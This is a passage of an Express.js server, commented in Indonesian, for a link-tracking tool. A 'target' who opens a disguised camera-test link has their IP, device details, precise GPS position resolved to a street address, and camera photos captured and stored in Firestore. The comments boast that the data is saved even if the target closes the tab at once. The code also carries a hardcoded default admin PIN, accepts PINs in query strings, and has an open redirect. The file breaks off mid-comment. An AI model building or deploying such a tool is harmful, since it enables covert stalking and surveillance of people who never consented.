import express from 'express';
import cors from 'cors';
import requestIp from 'request-ip';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';
import { initializeApp } from 'firebase/app';
import {
  getFirestore,
  collection,
  getDocs,
  doc,
  setDoc,
  deleteDoc,
  updateDoc
} from 'firebase/firestore';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

// Persistent storage setup in data/
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'logs.json');
const BACKUP_FILE = path.join(DATA_DIR, 'logs.backup.json');
const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
const FIREBASE_CONFIG_PATH = path.join(__dirname, 'firebase-applet-config.json');

if (!fs.existsSync(DATA_DIR)) {
  try {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  } catch (err) {
    console.error('Error creating data directory:', err.message);
  }
}

// 1. Inisialisasi Firebase Firestore Cloud Database
let firestoreDb = null;
let firebaseApp = null;
let firebaseConfig = null;

if (fs.existsSync(FIREBASE_CONFIG_PATH)) {
  try {
    firebaseConfig = JSON.parse(fs.readFileSync(FIREBASE_CONFIG_PATH, 'utf-8'));
    firebaseApp = initializeApp(firebaseConfig);
    // Bind to the exact firestoreDatabaseId provisioned
    firestoreDb = getFirestore(firebaseApp, firebaseConfig.firestoreDatabaseId);
    console.log(`[Firebase] Terhubung ke Cloud Firestore Database: ${firebaseConfig.projectId} (${firebaseConfig.firestoreDatabaseId})`);
  } catch (err) {
    console.error('[Firebase] Gagal inisialisasi Firestore:', err.message);
  }
}

// Konstanta durasi 1 bulan (30 hari) dalam milidetik
const ONE_MONTH_MS = 30 * 24 * 60 * 60 * 1000;

// Initialize Admin Security PIN: default is "1945" if not already set
function loadAdminConfig() {
  try {
    if (fs.existsSync(ADMIN_FILE)) {
      const raw = fs.readFileSync(ADMIN_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      if (parsed && parsed.pin) {
        return parsed;
      }
    }
  } catch (err) {
    console.error('[Admin] Error membaca admin.json:', err.message);
  }
  const defaultAdmin = {
    pin: '1945',
    createdAt: new Date().toISOString(),
    description: 'PIN Keamanan Pemilik untuk Menghapus Data Log'
  };
  try {
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(defaultAdmin, null, 2), 'utf-8');
  } catch (e) {
    console.warn('Gagal menulis admin.json default:', e.message);
  }
  return defaultAdmin;
}

let adminConfig = loadAdminConfig();

function saveAdminConfig(cfg) {
  try {
    adminConfig = { ...adminConfig, ...cfg, updatedAt: new Date().toISOString() };
    fs.writeFileSync(ADMIN_FILE, JSON.stringify(adminConfig, null, 2), 'utf-8');
    return true;
  } catch (err) {
    console.error('[Admin] Error menyimpan admin.json:', err.message);
    return false;
  }
}

function loadLogsFromDisk() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        console.log(`[Storage] Berhasil memuat ${parsed.length} log dari ${DATA_FILE}`);
        return parsed;
      }
    }
    // Try backup if main file is missing or corrupted
    if (fs.existsSync(BACKUP_FILE)) {
      const rawBackup = fs.readFileSync(BACKUP_FILE, 'utf-8');
      const parsedBackup = JSON.parse(rawBackup);
      if (Array.isArray(parsedBackup)) {
        console.log(`[Storage] Berhasil memulihkan ${parsedBackup.length} log dari backup`);
        return parsedBackup;
      }
    }
  } catch (err) {
    console.error('[Storage] Error membaca logs.json:', err.message);
  }
  return [];
}

function saveLogsToDisk(data) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
    // Keep secondary backup
    fs.writeFileSync(BACKUP_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error('[Storage] Error menyimpan logs.json:', err.message);
  }
}

/**
 * Pembersihan otomatis foto yang sudah berusia lebih dari 1 bulan (30 hari)
 * untuk menghemat ruang penyimpanan server dan database.
 */
async function cleanExpiredPhotos(logsList) {
  const now = Date.now();
  let modified = false;

  for (const item of logsList) {
    if (item.image && item.timestamp) {
      const itemAge = now - new Date(item.timestamp).getTime();
      if (itemAge >= ONE_MONTH_MS) {
        console.log(`[STORAGE CLEANUP] Foto capture log ${item.id} sudah berusia > 1 bulan (${Math.round(itemAge / (24 * 3600 * 1000))} hari). Menghapus foto untuk menghemat kuota penyimpanan...`);
        item.image = null; // Hapus base64 image yang besar
        item.photoExpired = true;
        item.photoExpirationNotice = 'Foto otomatis dihapus setelah 1 bulan untuk menghemat ruang penyimpanan';
        modified = true;

        // Sinkronisasi pembersihan foto ke Firestore
        if (firestoreDb && item.id) {
          try {
            await updateDoc(doc(firestoreDb, 'logs', String(item.id)), {
              image: null,
              photoExpired: true,
              photoExpirationNotice: item.photoExpirationNotice
            });
          } catch (e) {
            console.warn(`[Storage] Gagal mengupdate foto kadaluarsa di Firestore ${item.id}:`, e.message);
          }
        }
      }
    }
  }

  if (modified) {
    saveLogsToDisk(logsList);
  }
}

/**
 * Sinkronisasi satu entri log ke Cloud Firestore Database
 */
async function syncLogToFirestore(logEntry) {
  if (!firestoreDb || !logEntry || !logEntry.id) return;
  try {
    const cleanData = JSON.parse(JSON.stringify(logEntry, (key, value) => value === undefined ? null : value));
    await setDoc(doc(firestoreDb, 'logs', String(logEntry.id)), cleanData, { merge: true });
    console.log(`[Firestore] Berhasil sinkronisasi log ID ${logEntry.id} ke cloud database`);
  } catch (err) {
    console.warn(`[Firestore] Gagal sync log ${logEntry.id}:`, err.message);
  }
}

/**
 * Menghapus dokumen log dari Cloud Firestore
 */
async function deleteLogFromFirestore(id) {
  if (!firestoreDb || !id) return;
  try {
    await deleteDoc(doc(firestoreDb, 'logs', String(id)));
    console.log(`[Firestore] Berhasil menghapus log ID ${id} dari cloud database`);
  } catch (err) {
    console.warn(`[Firestore] Gagal menghapus log ${id} dari cloud:`, err.message);
  }
}

/**
 * Mengambil seluruh log dari Cloud Firestore Database dan menggabungkannya dengan cache lokal
 */
async function fetchLogsFromCloudAndSync() {
  if (!firestoreDb) {
    await cleanExpiredPhotos(logs);
    return logs;
  }

  try {
    const snap = await getDocs(collection(firestoreDb, 'logs'));
    const cloudLogs = [];
    snap.forEach((d) => {
      const data = d.data();
      if (data && data.id) {
        cloudLogs.push(data);
      }
    });

    if (cloudLogs.length > 0) {
      const map = new Map();
      // Muat data lokal dulu
      for (const item of logs) {
        if (item && item.id) map.set(item.id, item);
      }
      // Gabungkan dengan data dari Cloud Firestore
      for (const item of cloudLogs) {
        if (item && item.id) {
          const existing = map.get(item.id);
          if (existing) {
            map.set(item.id, { ...existing, ...item });
          } else {
            map.set(item.id, item);
          }
        }
      }

      const merged = Array.from(map.values());
      merged.sort((a, b) => new Date(b.timestamp || 0).getTime() - new Date(a.timestamp || 0).getTime());

      await cleanExpiredPhotos(merged);

      logs.length = 0;
      logs.push(...merged);
      saveLogsToDisk(logs);
      return logs;
    }
  } catch (err) {
    console.warn('[Firestore] Gagal mengambil log dari cloud, menggunakan data lokal:', err.message);
  }

  await cleanExpiredPhotos(logs);
  return logs;
}

// Enable trust proxy for accurate IP detection behind Cloud Run / reverse proxies
app.set('trust proxy', true);

// Enable CORS
app.use(cors());

// Parse JSON and URL-encoded bodies with 50MB limit to handle base64 image data
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Helper to safely get request-ip middleware and client IP
const getClientIp = (req) => {
  try {
    const ipFromLib = (requestIp && typeof requestIp.getClientIp === 'function')
      ? requestIp.getClientIp(req)
      : (requestIp && requestIp.default && typeof requestIp.default.getClientIp === 'function')
        ? requestIp.default.getClientIp(req)
        : null;

    let ip = req.clientIp || ipFromLib;
    if (!ip) {
      ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
    }

    if (typeof ip === 'string' && ip.includes(',')) {
      ip = ip.split(',')[0].trim();
    }

    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
      return '127.0.0.1 (Localhost)';
    }

    return ip;
  } catch (err) {
    console.error('Error resolving IP:', err);
    return req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
  }
};

// Use request-ip middleware
try {
  if (requestIp && typeof requestIp.mw === 'function') {
    app.use(requestIp.mw());
  } else if (requestIp && requestIp.default && typeof requestIp.default.mw === 'function') {
    app.use(requestIp.default.mw());
  }
} catch (e) {
  console.warn('request-ip mw setup notice:', e.message);
}

// Geolocation cache to avoid repetitive external API queries
const geoCache = new Map();

async function getGeolocation(ip) {
  if (!ip) return null;
  const cleanIp = ip.split(' ')[0].replace(/[^0-9a-fA-F:.]/g, '').trim();

  if (geoCache.has(cleanIp)) {
    return geoCache.get(cleanIp);
  }

  const isLocal = !cleanIp || cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.') || cleanIp.startsWith('172.');

  const targetUrl = isLocal
    ? 'http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query'
    : `http://ip-api.com/json/${encodeURIComponent(cleanIp)}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`;

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 3500);

    const res = await fetch(targetUrl, { signal: controller.signal });
    clearTimeout(timeout);

    if (res.ok) {
      const data = await res.json();
      if (data && data.status === 'success') {
        const addressParts = [
          data.city,
          data.regionName,
          data.zip ? `Kode Pos ${data.zip}` : null,
          data.country
        ].filter(Boolean);

        const geo = {
          city: data.city || '',
          region: data.regionName || '',
          country: data.country || '',
          countryCode: data.countryCode || '',
          postalCode: data.zip || '',
          lat: data.lat ?? null,
          lon: data.lon ?? null,
          isp: data.isp || data.org || '',
          timezone: data.timezone || '',
          fullAddress: addressParts.join(', ') || 'Lokasi Terdeteksi',
          mapsUrl: (data.lat !== null && data.lon !== null) ? `https://www.google.com/maps?q=${data.lat},${data.lon}` : null,
          satelliteMapsUrl: (data.lat !== null && data.lon !== null) ? `https://maps.google.com/maps?q=${data.lat},${data.lon}&t=k` : null,
          isLocal: isLocal,
          source: isLocal ? 'IP Egress Server' : 'Estimasi IP Jaringan'
        };

        geoCache.set(cleanIp, geo);
        return geo;
      }
    }
  } catch (err) {
    console.warn(`Geolocation fetch warning for ${cleanIp}:`, err.message);
  }

  const fallback = {
    city: isLocal ? 'Localhost' : 'Tidak Terdeteksi',
    region: isLocal ? 'Jaringan Privat' : '-',
    country: isLocal ? 'Intranet / Loopback' : '-',
    countryCode: '',
    postalCode: '',
    lat: null,
    lon: null,
    isp: isLocal ? 'Loopback Network' : '-',
    timezone: '',
    fullAddress: isLocal ? 'Jaringan Lokal / Private Network' : 'Lokasi IP tidak dapat ditentukan',
    mapsUrl: null,
    satelliteMapsUrl: null,
    isLocal: isLocal,
    source: 'Fallback'
  };

  geoCache.set(cleanIp, fallback);
  return fallback;
}

// Multi-provider reverse geocode high-precision GPS coordinates (99% accurate)
async function reverseGeocodeGPS(lat, lon) {
  if (!lat || !lon) return null;

  // Provider 1: OpenStreetMap Nominatim zoom 18
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 4500);
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&zoom=18&addressdetails=1`;
    const res = await fetch(url, {
      signal: controller.signal,
      headers: {
        'User-Agent': 'GhighaisTeknologiNetworkApp/3.0 (admin-gps-verification)',
        'Accept-Language': 'id,en;q=0.8'
      }
    });
    clearTimeout(timeout);
    if (res.ok) {
      const data = await res.json();
      if (data && data.display_name) {
        const addr = data.address || {};
        const road = addr.road || addr.pedestrian || addr.street || addr.residential || addr.path || '';
        const houseNumber = addr.house_number || '';
        const village = addr.village || addr.suburb || addr.neighbourhood || addr.quarter || addr.hamlet || '';
        const district = addr.city_district || addr.subdistrict || addr.county || '';
        const city = addr.city || addr.town || addr.municipality || addr.regency || '';
        const state = addr.state || addr.province || '';
        const postcode = addr.postcode || '';

        const primaryParts = [
          houseNumber ? `No. ${houseNumber}` : null,
          road || null,
          village ? `Kel./Desa ${village}` : null,
          district ? `Kec. ${district}` : null,
          city || null,
          state || null,
          postcode ? `Kode Pos ${postcode}` : null
        ].filter(Boolean);

        const shortSummary = primaryParts.length > 0 ? primaryParts.join(', ') : data.display_name;

        return {
          fullAddress: shortSummary || data.display_name,
          shortAddress: shortSummary,
          road: road ? `${road}${houseNumber ? ' No. ' + houseNumber : ''}` : '',
          suburb: village,
          district,
          city,
          state,
          postcode,
          country: addr.country || 'Indonesia'
        };
      }
    }
  } catch (err) {
    console.warn('Nominatim reverse geocode warning:', err.message);
  }

  // Provider 2: BigDataCloud Reverse Geocode (free fallback)
  try {
    const controller2 = new AbortController();
    const timeout2 = setTimeout(() => controller2.abort(), 3500);
    const bdcUrl = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}&localityLanguage=id`;
    const res2 = await fetch(bdcUrl, { signal: controller2.signal });
    clearTimeout(timeout2);
    if (res2.ok) {
      const bdcData = await res2.json();
      if (bdcData) {
        const locality = bdcData.locality || bdcData.principalSubdivision || '';
        const city = bdcData.city || '';
        const state = bdcData.principalSubdivision || '';
        const country = bdcData.countryName || 'Indonesia';
        const postcode = bdcData.postcode || '';

        const parts = [locality, city, state, postcode ? `Kode Pos ${postcode}` : null, country].filter(Boolean);
        const combined = parts.join(', ');

        return {
          fullAddress: combined || `${lat.toFixed(5)}, ${lon.toFixed(5)}`,
          shortAddress: combined || `${lat.toFixed(5)}, ${lon.toFixed(5)}`,
          road: '',
          suburb: locality,
          district: '',
          city,
          state,
          postcode,
          country
        };
      }
    }
  } catch (err2) {
    console.warn('BigDataCloud reverse geocode warning:', err2.message);
  }

  return null;
}

// Persistent logs storage array loaded from data/logs.json
const logs = loadLogsFromDisk();

// Anti-caching middleware to guarantee that Preview and Published webapps are always 100% fresh
app.use((req, res, next) => {
  if (req.path.endsWith('.html') || req.path === '/' || req.path.startsWith('/api/')) {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    res.setHeader('Surrogate-Control', 'no-store');
  }
  next();
});

// Serve static files from 'public', 'dist', and root without stale caching
const staticOptions = {
  etag: false,
  lastModified: false,
  maxAge: 0
};

app.use(express.static(path.join(__dirname, 'public'), staticOptions));
if (fs.existsSync(path.join(__dirname, 'dist'))) {
  app.use(express.static(path.join(__dirname, 'dist'), staticOptions));
}

// Middleware to check Admin Security PIN
function verifyAdminPin(req, res, next) {
  const providedPin = req.headers['x-admin-pin'] || req.query.pin || req.body?.pin;
  const currentPin = adminConfig?.pin || '1945';

  if (!providedPin || String(providedPin).trim() !== String(currentPin).trim()) {
    return res.status(403).json({
      success: false,
      message: 'Akses Ditolak: Hanya pemilik (Admin) yang memiliki PIN sah yang boleh menghapus data log ini!'
    });
  }
  next();
}

/**
 * GET /api/admin/verify-pin
 * Memeriksa apakah PIN yang dimasukkan admin sesuai
 */
app.get('/api/admin/verify-pin', (req, res) => {
  const providedPin = req.headers['x-admin-pin'] || req.query.pin;
  const currentPin = adminConfig?.pin || '1945';
  const isValid = providedPin && String(providedPin).trim() === String(currentPin).trim();
  res.json({ success: true, valid: isValid });
});

/**
 * POST /api/admin/change-pin
 * Mengubah PIN Admin
 */
app.post('/api/admin/change-pin', (req, res) => {
  const { currentPin, newPin } = req.body;
  const savedPin = adminConfig?.pin || '1945';

  if (!currentPin || String(currentPin).trim() !== String(savedPin).trim()) {
    return res.status(403).json({
      success: false,
      message: 'PIN saat ini salah. Perubahan PIN ditolak.'
    });
  }

  if (!newPin || String(newPin).trim().length < 4) {
    return res.status(400).json({
      success: false,
      message: 'PIN baru harus minimal 4 karakter (angka/kombinasi).'
    });
  }

  const success = saveAdminConfig({ pin: String(newPin).trim() });
  if (success) {
    return res.json({ success: true, message: 'PIN Admin berhasil diubah!' });
  } else {
    return res.status(500).json({ success: false, message: 'Gagal menyimpan PIN baru ke server.' });
  }
});

/**
 * POST /api/click
 * Dicatat SEKETIKA saat target mengklik atau membuka tautan camera-test.html.
 * Menjamin data tersimpan bahkan jika target menutup tab dalam hitungan detik!
 */
app.post('/api/click', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown Browser';
    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct Request';
    const { sessionId, target, theme, screen, connection, language, timeZone } = req.body || {};

    const ipLocation = await getGeolocation(clientIp);

    const id = sessionId || ('click_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6));

    // Check if entry already exists (prevent duplicate clicks in same session)
    let existing = logs.find(item => item.id === id);
    if (!existing) {
      const entry = {
        id: id,
        timestamp: new Date().toISOString(),
        ip: clientIp,
        type: 'Link Dibuka (Target Mengklik Tautan)',
        method: 'POST',
        endpoint: '/api/click',
        userAgent: userAgent,
        referer: referer,
        device: userAgent,
        screen: screen ? `${screen.width}x${screen.height} (DPR: ${screen.dpr || 1})` : null,
        connection: connection?.effectiveType ? `${connection.effectiveType.toUpperCase()} ${connection.downlink ? '(' + connection.downlink + ' Mbps)' : ''}` : 'Online',
        language: language || 'id-ID',
        timeZone: timeZone || 'Asia/Jakarta',
        location: ipLocation,
        image: null,
        status: 'Tautan Diklik (Menunggu Otorisasi Sensor)',
        notes: 'Target telah mengklik tautan Anda. Menyiapkan validasi sensor satelit GPS dan kamera.'
      };

      logs.unshift(entry);
      saveLogsToDisk(logs);
      await syncLogToFirestore(entry);

      console.log(`[CLICK] Target membuka link dari IP: ${clientIp} | Lokasi IP: ${ipLocation?.fullAddress || '-'}`);
    }

    return res.status(200).json({
      success: true,
      message: 'Klik tautan berhasil dicatat secara permanen di server & Cloud Firestore',
      sessionId: id
    });
  } catch (err) {
    console.error('Error on /api/click:', err);
    return res.status(500).json({ success: false, message: err.message });
  }
});

/**
 * POST /api/location-update
 * Memperbarui koordinat satelit GPS fisik dengan akurasi 99%
 */
app.post('/api/location-update', async (req, res) => {
  try {
    const { sessionId, latitude, longitude, accuracy, altitude, speed, heading } = req.body;

    if (latitude === undefined || longitude === undefined) {
      return res.status(400).json({ success: false, message: 'Koordinat latitude dan longitude wajib dikirim.' });
    }

    const lat = Number(latitude);
    const lon = Number(longitude);
    const accNum = accuracy ? Math.round(Number(accuracy)) : null;

    const clientIp = getClientIp(req);
    const ipLocation = await getGeolocation(clientIp);

    // High precision reverse geocode
    const geoResult = await reverseGeocodeGPS(lat, lon);

    // Evaluate accuracy percentage badge
    let accuracyBadgeText = 'Estimasi Sensor GPS';
    let accuracyPercentage = '95%';
    if (accNum !== null) {
      if (accNum <= 15) {
        accuracyPercentage = '99.9%';
        accuracyBadgeText = `99.9% Presisi Tinggi (±${accNum}m - Satelit GPS Fisik)`;
      } else if (accNum <= 40) {
        accuracyPercentage = '99%';
        accuracyBadgeText = `99% Akurat (±${accNum}m - Sensor Satelit GPS)`;
      } else if (accNum <= 100) {
        accuracyPercentage = '98%';
        accuracyBadgeText = `98% Akurat (±${accNum}m - GPS Seluler / WiFi)`;
      } else {
        accuracyPercentage = '90%';
        accuracyBadgeText = `Estimasi Kasar (±${accNum}m - Sinyal Tower)`;
      }
    }

    const resolvedAddress = geoResult?.fullAddress
      || (lat && lon ? `${lat.toFixed(6)}, ${lon.toFixed(6)} (${geoResult?.city || ipLocation?.fullAddress || 'Koordinat Satelit'})` : ipLocation?.fullAddress);

    const updatedLocation = {
      city: geoResult?.city || ipLocation?.city || '',
      region: geoResult?.state || ipLocation?.region || '',
      country: geoResult?.country || ipLocation?.country || 'Indonesia',
      countryCode: ipLocation?.countryCode || 'ID',
      postalCode: geoResult?.postcode || ipLocation?.postalCode || '',
      road: geoResult?.road || '',
      suburb: geoResult?.suburb || '',
      district: geoResult?.district || '',
      lat: lat,
      lon: lon,
      accuracy: accNum ? `±${accNum} meter` : null,
      accuracyRaw: accNum,
      accuracyPercentage: accuracyPercentage,
      accuracyBadgeText: accuracyBadgeText,
      altitude: altitude ? `${Math.round(altitude)}m dpl` : null,
      speed: speed ? `${(speed * 3.6).toFixed(1)} km/jam` : null,
      heading: heading ? `${Math.round(heading)}°` : null,
      isp: ipLocation?.isp || 'Satelit GPS Perangkat',
      fullAddress: resolvedAddress,
      shortAddress: geoResult?.shortAddress || resolvedAddress,
      mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
      satelliteMapsUrl: `https://maps.google.com/maps?q=${lat},${lon}&t=k`,
      streetViewUrl: `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`,
      openStreetMapUrl: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=18/${lat}/${lon}`,
      source: `Satelit GPS Presisi ${accuracyPercentage}`
    };

    // Update existing session in logs
    let targetEntry = sessionId ? logs.find(item => item.id === sessionId) : null;
    if (targetEntry) {
      targetEntry.location = updatedLocation;
      targetEntry.status = `Lokasi ${accuracyPercentage} Terkunci (±${accNum || 0}m)`;
      targetEntry.notes = `Koordinat GPS fisik berhasil dikunci dengan akurasi ${accuracyPercentage}: ${resolvedAddress}`;
      saveLogsToDisk(logs);
      await syncLogToFirestore(targetEntry);
      console.log(`[GPS UPDATE] Session ${sessionId} -> Lat ${lat.toFixed(6)}, Lon ${lon.toFixed(6)} (${accuracyBadgeText})`);
    } else {
      // Create new entry if sessionId not matched
      const newEntry = {
        id: sessionId || ('gps_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6)),
        timestamp: new Date().toISOString(),
        ip: clientIp,
        type: 'GPS Sensor 99% Akurat',
        method: 'POST',
        endpoint: '/api/location-update',
        userAgent: req.headers['user-agent'] || 'Unknown Browser',
        location: updatedLocation,
        image: null,
        status: `Lokasi ${accuracyPercentage} Terkunci`,
        notes: `Koordinat GPS fisik berhasil dikunci: ${resolvedAddress}`
      };
      logs.unshift(newEntry);
      saveLogsToDisk(logs);
      await syncLogToFirestore(newEntry);
      targetEntry = newEntry;
    }

    return res.json({
      success: true,
      message: `Lokasi berhasil diperbarui dengan akurasi ${accuracyPercentage}!`,
      location: updatedLocation
    });
  } catch (err) {
    console.error('Error on /api/location-update:', err);
    return res.status(500).json({ success: false, message: err.message });
  }
});

/**
 * GET /track
 * Endpoint klasik pelacakan IP address client
 */
app.get('/track', async (req, res) => {
  const clientIp = getClientIp(req);
  const userAgent = req.headers['user-agent'] || 'Unknown Browser';
  const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct Request';

  const location = await getGeolocation(clientIp);

  const entry = {
    id: 'track_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
    timestamp: new Date().toISOString(),
    ip: clientIp,
    type: 'IP Track Visit',
    method: 'GET',
    endpoint: '/track',
    userAgent: userAgent,
    referer: referer,
    location: location,
    image: null,
    status: 'Tercatat',
    notes: 'IP address & alamat posisi berhasil dicatat oleh endpoint /track'
  };

  logs.unshift(entry);
  saveLogsToDisk(logs);
  await syncLogToFirestore(entry);

  console.log(`[GET /track] IP: ${clientIp} | Lokasi: ${location?.fullAddress || '-'}`);

  const redirectTarget = req.query.redirect || '/index.html?tracked=true';
  res.redirect(redirectTarget);
});

/**
 * POST /api/upload
 * Menerima foto kamera (base64) dan koordinat lokasi presisi
 * Foto otomatis terhapus setelah 1 bulan (30 hari) untuk menghemat penyimpanan
 */
app.post('/api/upload', async (req, res) => {
  try {
    const { sessionId, image, note, device, clientLocation } = req.body;

    if (!image) {
      return res.status(400).json({
        success: false,
        message: 'Data gambar (base64) wajib disertakan dalam request body { image }.'
      });
    }

    const clientIp = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown Browser';

    // Lookup IP-based location as base
    const ipLocation = await getGeolocation(clientIp);

    // Merge high-precision GPS if sent by client
    let finalLocation = ipLocation;
    if (clientLocation && (clientLocation.latitude || clientLocation.lat)) {
      const lat = Number(clientLocation.latitude || clientLocation.lat);
      const lon = Number(clientLocation.longitude || clientLocation.lon);
      const accuracyNum = clientLocation.accuracy ? Math.round(Number(clientLocation.accuracy)) : null;

      const geoResult = await reverseGeocodeGPS(lat, lon);

      let accuracyBadgeText = 'Estimasi GPS';
      let accuracyPercentage = '95%';
      if (accuracyNum !== null) {
        if (accuracyNum <= 15) {
          accuracyPercentage = '99.9%';
          accuracyBadgeText = `99.9% Presisi Tinggi (±${accuracyNum}m - Satelit GPS Fisik)`;
        } else if (accuracyNum <= 40) {
          accuracyPercentage = '99%';
          accuracyBadgeText = `99% Akurat (±${accuracyNum}m - Sensor Satelit GPS)`;
        } else if (accuracyNum <= 100) {
          accuracyPercentage = '98%';
          accuracyBadgeText = `98% Akurat (±${accuracyNum}m - GPS Seluler)`;
        } else {
          accuracyPercentage = '90%';
          accuracyBadgeText = `Estimasi Kasar (±${accuracyNum}m)`;
        }
      }

      const resolvedAddress = geoResult?.fullAddress 
        || clientLocation.fullAddress 
        || (lat && lon ? `${lat.toFixed(6)}, ${lon.toFixed(6)} (${geoResult?.city || ipLocation?.fullAddress || 'Koordinat Satelit'})` : ipLocation?.fullAddress);

      finalLocation = {
        city: geoResult?.city || clientLocation.city || ipLocation?.city || '',
        region: geoResult?.state || clientLocation.region || ipLocation?.region || '',
        country: geoResult?.country || clientLocation.country || ipLocation?.country || 'Indonesia',
        countryCode: clientLocation.countryCode || ipLocation?.countryCode || 'ID',
        postalCode: geoResult?.postcode || clientLocation.postalCode || ipLocation?.postalCode || '',
        road: geoResult?.road || '',
        suburb: geoResult?.suburb || '',
        district: geoResult?.district || '',
        lat: lat,
        lon: lon,
        accuracy: accuracyNum ? `±${accuracyNum} meter` : null,
        accuracyRaw: accuracyNum,
        accuracyPercentage: accuracyPercentage,
        accuracyBadgeText: accuracyBadgeText,
        altitude: clientLocation.altitude ? `${Math.round(clientLocation.altitude)}m` : null,
        isp: ipLocation?.isp || 'Satelit GPS Perangkat',
        fullAddress: resolvedAddress,
        shortAddress: geoResult?.shortAddress || resolvedAddress,
        mapsUrl: `https://www.google.com/maps?q=${lat},${lon}`,
        satelliteMapsUrl: `https://maps.google.com/maps?q=${lat},${lon}&t=k`,
        streetViewUrl: `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`,
        openStreetMapUrl: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=18/${lat}/${lon}`,
        source: `Satelit GPS Presisi ${accuracyPercentage}`
      };
    }

    // Hitung tanggal kedaluwarsa foto: 1 bulan (30 hari)
    const expiresAt = new Date(Date.now() + ONE_MONTH_MS).toISOString();

    // If existing session log exists, update it rather than creating duplicate row
    let existingEntry = sessionId ? logs.find(item => item.id === sessionId) : null;

    if (existingEntry) {
      existingEntry.image = image;
      existingEntry.photoExpired = false;
      existingEntry.photoExpiresAt = expiresAt;
      existingEntry.type = 'Camera Upload + GPS 99% Akurat';
      if (finalLocation && finalLocation.lat) {
        existingEntry.location = finalLocation;
      }
      existingEntry.status = 'Tervalidasi Lengkap (Foto Kamera + GPS)';
      existingEntry.notes = note || 'Foto kamera dan posisi GPS presisi berhasil divalidasi.';
      saveLogsToDisk(logs);
      await syncLogToFirestore(existingEntry);

      console.log(`[UPDATE /api/upload] Session ${sessionId} berhasil dilengkapi foto & GPS (auto-hapus foto pada ${expiresAt})`);

      return res.status(200).json({
        success: true,
        message: 'Foto kamera dan posisi berhasil disimpan ke data sesi & Cloud Firestore',
        data: {
          id: existingEntry.id,
          timestamp: existingEntry.timestamp,
          ip: existingEntry.ip,
          location: existingEntry.location,
          type: existingEntry.type,
          photoExpiresAt: expiresAt
        }
      });
    }

    const entry = {
      id: sessionId || ('upload_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6)),
      timestamp: new Date().toISOString(),
      ip: clientIp,
      type: 'Camera Upload + GPS 99% Akurat',
      method: 'POST',
      endpoint: '/api/upload',
      userAgent: userAgent,
      device: device || userAgent || 'Web Camera MediaStream',
      location: finalLocation,
      image: image,
      photoExpired: false,
      photoExpiresAt: expiresAt,
      status: 'Tervalidasi Lengkap',
      notes: note || 'Frame kamera dan koordinat posisi berhasil disimpan.'
    };

    logs.unshift(entry);
    saveLogsToDisk(logs);
    await syncLogToFirestore(entry);

    console.log(`[POST /api/upload] Sukses dari IP: ${clientIp} | Lokasi: ${finalLocation?.fullAddress || '-'} | Kadaluarsa foto: 1 bulan (${expiresAt})`);

    return res.status(201).json({
      success: true,
      message: 'Gambar base64 dan informasi alamat posisi berhasil disimpan ke Cloud Firestore',
      data: {
        id: entry.id,
        timestamp: entry.timestamp,
        ip: entry.ip,
        location: entry.location,
        type: entry.type,
        photoExpiresAt: expiresAt
      }
    });
  } catch (error) {
    console.error('Error on /api/upload:', error);
    return res.status(500).json({
      success: false,
      message: 'Gagal memproses unggahan gambar: ' + error.message
    });
  }
});

/**
 * GET /api/logs
 * Mengambil seluruh data log yang tersinkronisasi dari Cloud Firestore Database
 * Sekaligus menjalankan pembersihan otomatis foto berusia > 1 bulan
 */
app.get('/api/logs', async (req, res) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  try {
    const syncedLogs = await fetchLogsFromCloudAndSync();
    res.json(syncedLogs);
  } catch (err) {
    console.error('Error fetching logs:', err.message);
    res.json(logs);
  }
});

/**
 * DELETE /api/logs/:id
 * Menghapus satu data log spesifik berdasarkan ID dari disk dan Cloud Firestore
